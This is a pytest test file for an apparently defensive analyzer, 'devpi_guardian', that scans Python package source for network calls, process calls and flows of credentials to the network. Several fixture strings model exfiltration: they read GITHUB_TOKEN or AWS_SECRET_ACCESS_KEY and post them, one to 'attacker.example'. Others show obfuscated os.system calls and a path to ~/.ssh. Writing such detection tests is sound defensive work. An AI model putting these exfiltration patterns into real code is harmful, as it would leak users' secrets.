from __future__ import annotations

import ast

import pytest

import devpi_guardian.analyzers.astutil as astutil_module
from devpi_guardian.analyzers.astutil import (
    AnalysisLimitExceeded,
    build_alias_table,
    credential_accesses,
    find_credential_network_flows,
    parse_python,
    scan_calls,
    top_level_calls,
)


def test_all_import_alias_forms_are_resolved() -> None:
    source = """
import subprocess
import subprocess as sp
from subprocess import run
from subprocess import call as invoke
subprocess.run([])
sp.call([])
run([])
invoke([])
"""
    tree = ast.parse(source)
    aliases = build_alias_table(tree)
    calls, _ = scan_calls(tree, source)

    assert aliases["subprocess"] == "subprocess"
    assert aliases["sp"] == "subprocess"
    assert aliases["run"] == "subprocess.run"
    assert aliases["invoke"] == "subprocess.call"
    assert [call.qualified_name for call in calls] == [
        "subprocess.run",
        "subprocess.call",
        "subprocess.run",
        "subprocess.call",
    ]


def test_comments_and_string_literals_do_not_create_calls() -> None:
    source = '# os.system("bad")\nTEXT = "subprocess.run"\n'
    calls, imports = scan_calls(ast.parse(source), source)
    assert calls == []
    assert imports == []


def test_dynamic_import_string_arguments_are_detected() -> None:
    source = '__import__("subprocess")\nimport importlib\nimportlib.import_module("requests")\n'
    _, imports = scan_calls(ast.parse(source), source)
    assert [(item.module, item.line) for item in imports] == [
        ("subprocess", 1),
        ("requests", 3),
    ]


def test_network_classification_distinguishes_values_from_real_io() -> None:
    source = """
import httpx
import requests
from urllib import request
from socket import create_connection

httpx.URL("https://example.test")
httpx.Response(200)
httpx.Client()
requests.Request("GET", "https://example.test")
request.Request("https://example.test")
httpx.get("https://example.test")
requests.post("https://example.test")
request.urlopen("https://example.test")
create_connection(("example.test", 443))
"""
    calls, _ = scan_calls(ast.parse(source), source)
    network = [call.qualified_name for call in calls if call.category == "network"]
    assert network == [
        "httpx.get",
        "requests.post",
        "urllib.request.urlopen",
        "socket.create_connection",
    ]


def test_client_io_tracks_bindings_contexts_and_reassignment() -> None:
    source = """
import httpx
import requests
from httpx import Client as HttpClient

direct = httpx.Client().get("https://example.test")
client = HttpClient()
client.post("https://example.test")
with requests.Session() as session:
    session.request("https://example.test")
session = {}
session.get("not-network")
with httpx.AsyncClient() as async_client:
    async_client.stream("GET", "https://example.test")
with httpx.Client() as persistent_client:
    pass
persistent_client.get("https://example.test")
"""
    calls, _ = scan_calls(ast.parse(source), source)
    network = [call for call in calls if call.category == "network"]
    assert [(call.qualified_name, call.line) for call in network] == [
        ("httpx.Client.get", 6),
        ("httpx.Client.post", 8),
        ("requests.Session.request", 10),
        ("httpx.AsyncClient.stream", 14),
        ("httpx.Client.get", 17),
    ]


def test_client_attribute_binding_tracks_reported_instance_case() -> None:
    source = """
import httpx

class Api:
    def __init__(self):
        self.client = httpx.Client()

    def fetch(self):
        return self.client.get("https://example.test")
"""
    calls, _ = scan_calls(ast.parse(source), source)
    assert [(call.qualified_name, call.line) for call in calls if call.category == "network"] == [
        ("httpx.Client.get", 9)
    ]


def test_client_attribute_tracking_supports_async_and_nested_paths() -> None:
    source = """
import httpx

class Api:
    async def __init__(self):
        self.transport.client = httpx.AsyncClient()

    async def fetch(self):
        return await self.transport.client.get("https://example.test")
"""
    calls, _ = scan_calls(ast.parse(source), source)
    assert [(call.qualified_name, call.line) for call in calls if call.category == "network"] == [
        ("httpx.AsyncClient.get", 9)
    ]


def test_client_attribute_class_seed_is_order_independent_and_receiver_names_differ() -> None:
    source = """
import httpx

class Api:
    def fetch(self):
        return self.client.get("https://example.test")

    def __init__(api):
        api.client = httpx.Client()
"""
    calls, _ = scan_calls(ast.parse(source), source)
    assert [(call.qualified_name, call.line) for call in calls if call.category == "network"] == [
        ("httpx.Client.get", 6)
    ]


def test_client_attribute_same_method_unknown_reassignment_invalidates() -> None:
    source = """
import httpx

class Api:
    def fetch(self):
        self.client = httpx.Client()
        self.client.get("https://one.example")
        self.client = FakeClient()
        self.client.get("not-network")
"""
    calls, _ = scan_calls(ast.parse(source), source)
    assert [(call.qualified_name, call.line) for call in calls if call.category == "network"] == [
        ("httpx.Client.get", 7)
    ]


def test_client_attribute_cross_method_unknown_or_conflicting_assignment_suppresses_seed() -> None:
    source = """
import httpx

class Unknown:
    def __init__(self):
        self.client = httpx.Client()

    def reset(self):
        self.client = FakeClient()

    def fetch(self):
        return self.client.get("not-network")

class Conflicting:
    def __init__(self):
        self.client = httpx.Client()

    def reset(self):
        self.client = httpx.AsyncClient()

    def fetch(self):
        return self.client.get("not-network")
"""
    calls, _ = scan_calls(ast.parse(source), source)
    assert [call for call in calls if call.category == "network"] == []


def test_client_attribute_parent_reassignment_invalidates_nested_path() -> None:
    source = """
import httpx

class Api:
    def __init__(self):
        self.transport.client = httpx.Client()

    def reset(self):
        self.transport = {}

    def fetch(self):
        return self.transport.client.get("not-network")
"""
    calls, _ = scan_calls(ast.parse(source), source)
    assert [call for call in calls if call.category == "network"] == []


def test_client_attribute_comprehension_target_invalidates_receiver_path() -> None:
    source = """
import httpx

class Api:
    def __init__(self):
        self.client = httpx.Client()

    def reset(self, values):
        [self.client for self.client in values]

    def fetch(self):
        return self.client.get("not-network")
"""
    calls, _ = scan_calls(ast.parse(source), source)
    assert [call for call in calls if call.category == "network"] == []


def test_client_attribute_class_summaries_are_isolated_and_static_class_methods_do_not_seed() -> (
    None
):
    source = """
import httpx

class Known:
    def __init__(self):
        self.client = httpx.Client()

    def fetch(self):
        return self.client.get("https://example.test")

class Other:
    def fetch(self):
        return self.client.get("not-network")

class Isolated:
    @staticmethod
    def initialize(value):
        value.client = httpx.Client()

    @classmethod
    def fetch(cls):
        return cls.client.get("not-network")
"""
    calls, _ = scan_calls(ast.parse(source), source)
    assert [(call.qualified_name, call.line) for call in calls if call.category == "network"] == [
        ("httpx.Client.get", 9)
    ]


def test_client_attribute_alias_copy_and_unrelated_get_values_are_precise() -> None:
    source = """
import httpx

client = httpx.Client()

class Api:
    def __init__(self):
        self.client = client
        self.other = self.client

    def fetch(self):
        values = {}
        httpx.URL("https://example.test")
        httpx.Response(200)
        FakeClient().get("not-network")
        values.get("not-network")
        self.client.get("https://example.test")
        self.other.post("https://example.test")
"""
    calls, _ = scan_calls(ast.parse(source), source)
    assert [(call.qualified_name, call.line) for call in calls if call.category == "network"] == [
        ("httpx.Client.get", 17),
        ("httpx.Client.post", 18),
    ]


def test_credential_flow_tracks_self_client_post_sink() -> None:
    source = """
import httpx
import os

class Api:
    def send(self):
        self.client = httpx.Client()
        token = os.getenv("GITHUB_TOKEN")
        self.client.post("https://example.test", data=token)
"""
    flows = find_credential_network_flows(ast.parse(source), source)
    assert [(flow.source.description, flow.sink.qualified_name) for flow in flows] == [
        ("os.getenv('GITHUB_TOKEN')", "httpx.Client.post")
    ]


@pytest.mark.parametrize(
    "source",
    [
        """
import os, requests
def send(os):
    token = os.getenv("GITHUB_TOKEN")
    requests.post("https://example.test", data=token)
""",
        """
import os, requests
os = Fake()
token = os.getenv("GITHUB_TOKEN")
requests.post("https://example.test", data=token)
""",
        """
import os, requests
def send(os):
    token = os.environ["GITHUB_TOKEN"]
    requests.post("https://example.test", data=token)
""",
    ],
)
def test_credential_accesses_ignore_shadowed_os_aliases(source: str) -> None:
    tree = ast.parse(source)

    assert credential_accesses(tree, source) == []
    assert find_credential_network_flows(tree, source) == []


def test_credential_accesses_follow_import_reimport_and_closure_scopes() -> None:
    source = """
import os, requests
def captured():
    token = os.getenv("GITHUB_TOKEN")
    requests.post("https://captured.example", data=token)

os = Fake()
os.getenv("GITHUB_TOKEN")
import os
token = os.environ["AWS_SECRET_ACCESS_KEY"]
requests.post("https://reimported.example", data=token)
"""
    tree = ast.parse(source)

    accesses = credential_accesses(tree, source)
    assert [item.description for item in accesses] == [
        "os.getenv('GITHUB_TOKEN')",
        "os.environ['AWS_SECRET_ACCESS_KEY']",
    ]
    flows = find_credential_network_flows(tree, source)
    assert [(flow.source.description, flow.sink.qualified_name) for flow in flows] == [
        ("os.getenv('GITHUB_TOKEN')", "requests.post"),
        ("os.environ['AWS_SECRET_ACCESS_KEY']", "requests.post"),
    ]


def test_connection_and_opener_instance_io_is_precise() -> None:
    source = """
import http.client as client_http
import socket
from urllib.request import build_opener

client_http.HTTPConnection("example.test")
connection = client_http.HTTPSConnection("example.test")
connection.connect()
opener = build_opener()
opener.open("https://example.test")
sock = socket.socket()
sock.sendall(b"payload")
"""
    calls, _ = scan_calls(ast.parse(source), source)
    network = [call.qualified_name for call in calls if call.category == "network"]
    assert network == [
        "http.client.HTTPSConnection.connect",
        "urllib.request.build_opener.open",
        "socket.socket.sendall",
    ]


def test_constructor_function_alias_is_tracked() -> None:
    source = """
import httpx
Client = httpx.Client
client = Client()
client.get("https://example.test")
"""
    calls, _ = scan_calls(ast.parse(source), source)
    assert [
        (call.qualified_name, call.category) for call in calls if call.category == "network"
    ] == [("httpx.Client.get", "network")]


def test_direct_and_chained_callable_aliases_are_tracked() -> None:
    source = """
import requests

send = requests.post
again = send
send("https://direct.example")
again("https://chained.example")
"""
    calls, _ = scan_calls(ast.parse(source), source)
    assert [
        (call.qualified_name, call.category) for call in calls if call.category == "network"
    ] == [("requests.post", "network"), ("requests.post", "network")]


def test_imported_callable_alias_in_function_is_tracked() -> None:
    source = """
def send_request():
    from requests import post
    post("https://function.example")
"""
    calls, _ = scan_calls(ast.parse(source), source)
    assert [
        (call.qualified_name, call.category) for call in calls if call.category == "network"
    ] == [("requests.post", "network")]


def test_bound_client_method_callable_alias_is_tracked() -> None:
    source = """
import httpx

client = httpx.Client()
send = client.post
send("https://bound.example")
"""
    calls, _ = scan_calls(ast.parse(source), source)
    assert [
        (call.qualified_name, call.category) for call in calls if call.category == "network"
    ] == [("httpx.Client.post", "network")]


@pytest.mark.parametrize(
    "source",
    [
        """
import requests
send = requests.post
send = object()
send("not-network")
""",
        """
import requests
send = requests.post
def call(send):
    send("not-network")
""",
        """
import requests
send = requests.post
for send in values:
    send("not-network")
""",
        """
import requests
send = requests.post
del send
send("not-network")
""",
    ],
)
def test_callable_aliases_are_invalidated_by_rebinding_and_scope_binders(source: str) -> None:
    calls, _ = scan_calls(ast.parse(source), source)
    assert [call for call in calls if call.category == "network"] == []


def test_callable_aliases_are_invalidated_by_with_except_and_comprehension_targets() -> None:
    source = """
import requests

send = requests.post
with context() as send:
    send("not-network")
send("https://with-restored.example")

send = requests.post
try:
    pass
except Exception as send:
    send("not-network")
send("https://except-invalidated.example")

send = requests.post
[send("not-network") for send in send_values]
send("https://comprehension-restored.example")
"""
    calls, _ = scan_calls(ast.parse(source), source)
    assert [(call.qualified_name, call.line) for call in calls if call.category == "network"] == [
        ("requests.post", 18),
    ]


def test_callable_aliases_are_invalidated_by_function_class_and_import_bindings() -> None:
    source = """
import requests

send = requests.post
def send():
    pass
send("not-network")

send = requests.post
class send:
    pass
send("not-network")

send = requests.post
from somewhere import send
send("not-network")
"""
    calls, _ = scan_calls(ast.parse(source), source)
    assert [call for call in calls if call.category == "network"] == []


def test_safe_constructor_callable_aliases_are_not_network_calls() -> None:
    source = """
import httpx

URL = httpx.URL
Response = httpx.Response
Client = httpx.Client
URL("https://example.test")
Response(200)
Client()
"""
    calls, _ = scan_calls(ast.parse(source), source)
    assert [call for call in calls if call.category == "network"] == []


def test_class_body_callable_aliases_do_not_leak_into_methods() -> None:
    source = """
import requests

class Example:
    send = requests.post

    def call(self):
        send("not-network")
"""
    calls, _ = scan_calls(ast.parse(source), source)
    assert [call for call in calls if call.category == "network"] == []


def test_callable_aliases_carry_credential_flow() -> None:
    source = """
import requests
import os

send = requests.post
secret = os.getenv("GITHUB_TOKEN")
send("https://attacker.example", data=secret)
"""
    flows = find_credential_network_flows(ast.parse(source), source)
    assert [(flow.source.description, flow.sink.qualified_name) for flow in flows] == [
        ("os.getenv('GITHUB_TOKEN')", "requests.post")
    ]


def test_custom_traversal_keeps_nested_calls_in_ast_children() -> None:
    source = """
import requests

def typed(value: requests.get("https://example.test")):
    return value

values = {}
values[requests.post("https://example.test")] = 1
class Example(requests.get("https://example.test"), metaclass=requests.post()):
    pass
"""
    calls, _ = scan_calls(ast.parse(source), source)
    network = [(call.qualified_name, call.line) for call in calls if call.category == "network"]
    assert network == [
        ("requests.get", 4),
        ("requests.post", 8),
        ("requests.get", 9),
        ("requests.post", 9),
    ]


def test_module_client_binding_is_visible_in_function_but_parameter_shadows_it() -> None:
    source = """
import httpx
client = httpx.Client()
def send():
    client.get("https://example.test")
def unrelated(client):
    client.get("not-network")
"""
    calls, _ = scan_calls(ast.parse(source), source)
    assert [(call.qualified_name, call.line) for call in calls if call.category == "network"] == [
        ("httpx.Client.get", 5)
    ]


def test_module_binding_visibility_keeps_source_order() -> None:
    source = """
import httpx

client = {}
def send():
    client.get("not-network")
client = httpx.Client()
"""
    calls, _ = scan_calls(ast.parse(source), source)
    assert [call for call in calls if call.category == "network"] == []


def test_import_aliases_are_sequential_and_lexically_scoped() -> None:
    source = """
import httpx
httpx.get("https://before.example")
httpx = Fake()
httpx.get("not-network")
import httpx
httpx.get("https://after.example")

def parameter(httpx):
    httpx.get("not-network")

def local_import():
    httpx.get("not-network")
    import httpx
    httpx.get("https://local.example")

def captured():
    return httpx.get("https://captured.example")
"""
    calls, _ = scan_calls(ast.parse(source), source)
    assert [call.line for call in calls if call.category == "network"] == [3, 7, 15, 18]


def test_module_call_before_import_is_not_network() -> None:
    source = """
httpx.get("not-network")
import httpx
httpx.get("https://after.example")
"""
    calls, _ = scan_calls(ast.parse(source), source)
    assert [(call.line, call.category) for call in calls] == [(2, None), (4, "network")]


def test_class_method_local_aliases_do_not_use_constructor_parameter_shadow() -> None:
    source = """
import httpx

class Api:
    def __init__(self, httpx):
        self.client = httpx.Client()

    def fetch(self):
        return self.client.get("not-network")

    def send(self):
        import httpx
        self.client = httpx.Client()
        return self.client.get("https://local.example")
"""
    calls, _ = scan_calls(ast.parse(source), source)
    assert [(call.line, call.qualified_name) for call in calls if call.category == "network"] == [
        (14, "httpx.Client.get")
    ]


def test_lambda_walrus_and_importlib_parameter_shadows_are_local() -> None:
    source = """
import httpx
import importlib
captured = lambda: httpx.get("https://captured.example")
shadowed = lambda: (httpx.get("not-network"), (httpx := Fake()))

def dynamic(importlib):
    importlib.import_module("requests")
"""
    calls, imports = scan_calls(ast.parse(source), source)
    assert [call.line for call in calls if call.category == "network"] == [4]
    assert imports == []


def test_comprehension_alias_scope_restores_method_import_and_tuple_targets() -> None:
    source = """
import httpx
client = httpx.Client()
values = [(client, value) for (client, value) in items]
client.get("https://example.test")

class Api:
    def send(self):
        import httpx
        [value for httpx in items]
        self.client = httpx.Client()
        return self.client.get("https://example.test")
"""
    calls, _ = scan_calls(ast.parse(source), source)
    assert [(call.line, call.qualified_name) for call in calls if call.category == "network"] == [
        (5, "httpx.Client.get"),
        (12, "httpx.Client.get"),
    ]


def test_class_collector_clears_inherited_bindings_for_local_names() -> None:
    source = """
import httpx
client = httpx.Client()
Client = httpx.Client

class Api:
    def __init__(self, client, Client):
        self.client = client
        self.other = Client()

    def run(self):
        self.client.get("not-network")
        self.other.get("not-network")
"""
    calls, _ = scan_calls(ast.parse(source), source)
    assert [call for call in calls if call.category == "network"] == []


def test_class_collector_invalidates_constructor_aliases_on_loop_and_except_targets() -> None:
    source = """
import httpx

class Api:
    def __init__(self):
        Client = httpx.Client
        for Client in values:
            pass
        self.client = Client()

    def run(self):
        self.client.get("not-network")

class Other:
    def __init__(self):
        Client = httpx.Client
        try:
            pass
        except Exception as Client:
            pass
        self.client = Client()

    def run(self):
        self.client.get("not-network")
"""
    calls, _ = scan_calls(ast.parse(source), source)
    assert [call for call in calls if call.category == "network"] == []


def test_class_collector_restores_name_bindings_after_comprehension() -> None:
    source = """
import httpx

class Api:
    def __init__(self):
        client = httpx.Client()
        [value for client in values]
        self.client = client

    def run(self):
        self.client.get("https://example.test")
"""
    calls, _ = scan_calls(ast.parse(source), source)
    assert [(call.qualified_name, call.line) for call in calls if call.category == "network"] == [
        ("httpx.Client.get", 11)
    ]


def test_guarded_roots_require_active_imports_after_parameter_shadowing() -> None:
    source = """
import shutil
from pathlib import Path

def copy(shutil):
    shutil.copy("a", "b")

def path(Path):
    Path("~/.ssh/config")
"""
    calls, _ = scan_calls(ast.parse(source), source)
    assert [call for call in calls if call.category in {"file_write", "credential_path"}] == []


def test_relative_imports_bind_as_noncanonical_local_names() -> None:
    source = """
from . import httpx
httpx.get("not-network")
"""
    calls, _ = scan_calls(ast.parse(source), source)
    assert [call for call in calls if call.category == "network"] == []


def test_class_collector_preserves_with_item_instance_bindings() -> None:
    source = """
import httpx

class Api:
    def __init__(self):
        with httpx.Client() as client:
            self.client = client

    def run(self):
        self.client.get("https://example.test")
"""
    calls, _ = scan_calls(ast.parse(source), source)
    assert [(call.qualified_name, call.line) for call in calls if call.category == "network"] == [
        ("httpx.Client.get", 10)
    ]


def test_class_collector_local_names_do_not_erase_receiver_summary_paths() -> None:
    source = """
import httpx

class Api:
    def __init__(self):
        self.client = httpx.Client()
        self.transport.client = httpx.Client()

    def clone(self):
        client = {}
        self.other = self.client
        transport = {}
        self.other_nested = self.transport.client

    def run(self):
        self.other.get("https://one.example")
        self.other_nested.get("https://two.example")
"""
    calls, _ = scan_calls(ast.parse(source), source)
    assert [(call.qualified_name, call.line) for call in calls if call.category == "network"] == [
        ("httpx.Client.get", 16),
        ("httpx.Client.get", 17),
    ]


def test_class_collector_comprehension_receiver_target_mutation_persists() -> None:
    source = """
import httpx

class Api:
    def __init__(self):
        self.client = httpx.Client()

    def mutate(self, values):
        [self.client for self.client in values]
        self.other = self.client

    def run(self):
        self.other.get("not-network")
"""
    calls, _ = scan_calls(ast.parse(source), source)
    assert [call for call in calls if call.category == "network"] == []


def test_module_binding_deletion_is_not_carried_into_class_summaries() -> None:
    source = """
import httpx

client = httpx.Client()
del client

class Api:
    def __init__(self):
        self.client = client

    def fetch(self):
        return self.client.get("not-network")
"""
    calls, _ = scan_calls(ast.parse(source), source)
    assert [call for call in calls if call.category == "network"] == []


def test_shadowing_root_clears_attribute_descendants_for_function_lambda_and_except() -> None:
    source = """
import httpx

holder.client = httpx.Client()
holder.transport.client = httpx.Client()

def run(holder):
    holder.client.get("not-network")
    holder.transport.client.get("not-network")

shadowed = lambda holder: (
    holder.client.get("not-network"), holder.transport.client.get("not-network")
)

try:
    pass
except Exception as holder:
    holder.client.get("not-network")
    holder.transport.client.get("not-network")
"""
    calls, _ = scan_calls(ast.parse(source), source)
    assert [call for call in calls if call.category == "network"] == []


def test_class_seed_remains_available_before_compatible_later_write() -> None:
    source = """
import httpx

class Api:
    def __init__(self):
        self.client = httpx.Client()

    def reset(self):
        self.client.get("https://example.test")
        self.client = httpx.Client()
"""
    calls, _ = scan_calls(ast.parse(source), source)
    assert [(call.qualified_name, call.line) for call in calls if call.category == "network"] == [
        ("httpx.Client.get", 9)
    ]


def test_class_path_future_assignment_does_not_seed_current_method() -> None:
    source = """
import httpx

class Api:
    def run(self):
        self.client.get("not-proven")
        self.client = httpx.Client()
"""
    calls, _ = scan_calls(ast.parse(source), source)
    assert [call for call in calls if call.category == "network"] == []


def test_init_future_assignment_does_not_seed_before_first_assignment() -> None:
    source = """
import httpx

class Api:
    def __init__(self):
        self.client.get("not-proven")
        self.client = httpx.Client()
"""
    calls, _ = scan_calls(ast.parse(source), source)
    assert [call for call in calls if call.category == "network"] == []


def test_nested_lambda_parameter_shadows_outer_client_but_capture_remains_network() -> None:
    source = """
import httpx
client = httpx.Client()
captured = lambda: client.get("https://example.test")
shadowed = lambda client: client.get("not-network")
"""
    calls, _ = scan_calls(ast.parse(source), source)
    assert [(call.qualified_name, call.line) for call in calls if call.category == "network"] == [
        ("httpx.Client.get", 4)
    ]


def test_exception_target_shadows_and_then_clears_outer_client() -> None:
    source = """
import httpx
client = httpx.Client()
try:
    pass
except Exception as client:
    client.get("not-network")
client.get("https://example.test")
    """
    calls, _ = scan_calls(ast.parse(source), source)
    assert [call for call in calls if call.category == "network"] == []


def test_comprehension_target_shadows_outer_client_in_element_and_nested_generators() -> None:
    source = """
import httpx
client = httpx.Client()
captured = [client.get("https://example.test") for _ in ({},)]
shadowed = [client.get("not-network") for client in ({},)]
nested = [
    client.get("not-network")
    for values in ({},)
    for client in values
]
client.get("https://example.test")
"""
    calls, _ = scan_calls(ast.parse(source), source)
    assert [(call.qualified_name, call.line) for call in calls if call.category == "network"] == [
        ("httpx.Client.get", 4),
        ("httpx.Client.get", 11),
    ]


def test_importlib_dynamic_import_is_not_dynamic_exec_but_dangerous_literal_remains() -> None:
    source = """
import importlib
importlib.import_module("pydantic.fields")
importlib.import_module("requests")
"""
    calls, imports = scan_calls(ast.parse(source), source)
    assert [call.qualified_name for call in calls if call.category == "dynamic_exec"] == []
    assert [(item.module, item.line) for item in imports] == [
        ("pydantic.fields", 3),
        ("requests", 4),
    ]


def test_getattr_with_constant_string_is_resolved_as_process_call() -> None:
    source = "import os\ngetattr(os, 'sys' + 'tem')('echo blocked')\n"
    calls, _ = scan_calls(ast.parse(source), source)
    process_calls = [call for call in calls if call.category == "process"]
    assert [(call.qualified_name, call.line) for call in process_calls] == [("os.system", 2)]


def test_python_source_and_ast_complexity_limits(monkeypatch) -> None:
    monkeypatch.setattr(astutil_module, "MAX_PYTHON_SOURCE_CHARS", 10)
    with pytest.raises(AnalysisLimitExceeded):
        parse_python("value = 12345\n")

    monkeypatch.setattr(astutil_module, "MAX_PYTHON_SOURCE_CHARS", 1_000)
    monkeypatch.setattr(astutil_module, "MAX_AST_NODES", 3)
    with pytest.raises(AnalysisLimitExceeded):
        parse_python("value = 1\n")


def test_safe_init_top_level_constructs_are_whitelisted() -> None:
    source = '''"""module"""
import logging
from typing import TypeVar
__version__ = "1.0"
__all__ = ["x"]
logger = logging.getLogger(__name__)
T = TypeVar("T")
'''
    assert top_level_calls(ast.parse(source)) == []


@pytest.mark.parametrize(
    "source",
    [
        "from typing import cast\ncast(str, 'value')\n",
        "import typing as t\nt.cast(str, 'value')\n",
        "from importlib.metadata import version\nversion('demo')\n",
        "import importlib.metadata as metadata\nmetadata.version('demo')\n",
        "from pkgutil import extend_path\nextend_path([], 'demo')\n",
        "import pkgutil as p\np.extend_path([], 'demo')\n",
    ],
)
def test_exact_imported_safe_top_level_calls_are_whitelisted(source: str) -> None:
    assert top_level_calls(ast.parse(source)) == []


@pytest.mark.parametrize("name", ["cast", "version", "extend_path"])
def test_local_functions_with_safe_names_are_not_whitelisted(name: str) -> None:
    source = f"def {name}(*args):\n    return args\n{name}('value')\n"
    calls = top_level_calls(ast.parse(source))
    assert [call.func.id for call in calls if isinstance(call.func, ast.Name)] == [name]


def test_local_redefinition_shadows_imported_safe_name() -> None:
    source = "from typing import cast\ndef cast(value):\n    return value\ncast('value')\n"
    calls = top_level_calls(ast.parse(source))
    assert len(calls) == 1
    assert isinstance(calls[0].func, ast.Name)
    assert calls[0].func.id == "cast"


def test_nested_safe_path_is_not_whitelisted_after_root_redefinition() -> None:
    source = "import importlib.metadata\nimportlib = evil\nimportlib.metadata.version('demo')\n"
    calls = top_level_calls(ast.parse(source))
    assert len(calls) == 1
    assert isinstance(calls[0].func, ast.Attribute)
    assert calls[0].func.attr == "version"


def test_comprehension_target_does_not_shadow_imported_safe_name() -> None:
    source = "from typing import cast\nvalues = [cast for cast in items]\ncast(str, 'value')\n"
    assert top_level_calls(ast.parse(source)) == []


def test_except_handler_name_shadows_imported_safe_name() -> None:
    source = (
        "from typing import cast\n"
        "try:\n"
        "    pass\n"
        "except Exception as cast:\n"
        "    cast(str, 'value')\n"
    )
    calls = top_level_calls(ast.parse(source))
    assert len(calls) == 1
    assert isinstance(calls[0].func, ast.Name)
    assert calls[0].func.id == "cast"


def test_named_expression_in_comprehension_conservatively_shadows_import() -> None:
    source = (
        "from typing import cast\n"
        "values = [(cast := value) for value in items]\n"
        "cast(str, 'value')\n"
    )
    calls = top_level_calls(ast.parse(source))
    assert len(calls) == 1
    assert isinstance(calls[0].func, ast.Name)
    assert calls[0].func.id == "cast"


def test_safe_wrapper_does_not_hide_nested_network_call() -> None:
    source = (
        "import typing\nimport requests\ntyping.cast(str, requests.get('https://example.test'))\n"
    )
    calls = top_level_calls(ast.parse(source))
    assert [call.func.attr for call in calls if isinstance(call.func, ast.Attribute)] == ["get"]


def test_risky_calls_inside_if_and_try_are_top_level_side_effects() -> None:
    source = """
import os
if True:
    os.system("echo blocked")
try:
    os.system("echo blocked")
except Exception:
    pass
"""
    calls = top_level_calls(ast.parse(source))
    assert [call.lineno for call in calls] == [4, 6]
